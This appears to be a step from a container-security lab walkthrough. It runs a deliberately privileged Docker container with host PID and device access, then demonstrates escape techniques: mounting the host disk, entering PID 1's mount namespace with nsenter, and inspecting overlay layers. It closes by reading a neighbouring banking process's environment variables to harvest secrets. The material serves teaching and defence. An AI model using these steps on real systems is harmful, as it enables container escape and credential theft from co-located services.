### Step 1: Atrocious Antelope
Let's first build our image:
```
cd ~/projects/container-lab
docker build -t mgm:0.0.1 --build-arg ARCH=$(uname -m) -f atrocious-antelope/Dockerfile .
docker run -it --rm --privileged --pid=host -p 3000:3000 --device=/dev/:/devbind/ mgm:0.0.1
```

Navigate to our really secure app:
[http://localhost:3000](http://localhost:3000)

You can now do naughty things.  You can check out the block devices with `lsblk` at this point.  Ruh roh!  You have a disk!

Go ahead and mount your disk: `mount /vdb1 /mnt`

If you're on orbstack, it's more complicated.  To give you a hint at how complicated it is, you can do the following:
`nsenter --mount=/proc/1/ns/mnt -- mount`
This will assume the mount namespace of PID 1 (on the host system), and list the mount devices.

You can do `cat /proc/self/mountinfo` to determine the overlayfs paths.  Notice all of the lowerdir paths?  Those are your layers for your container.  The merged overly should be at your `upperdir/../merged`.

If on btrfs, we can have fun with `btrfs`
```
apt-get btrfs-progs
btrfs subvolume snapshot /mnt /mnt/snappy
```

Get some information from neighbors:
```
# If you banking stack is running:
ps -ef | grep node
cat /proc/<nodePID>/environ
```
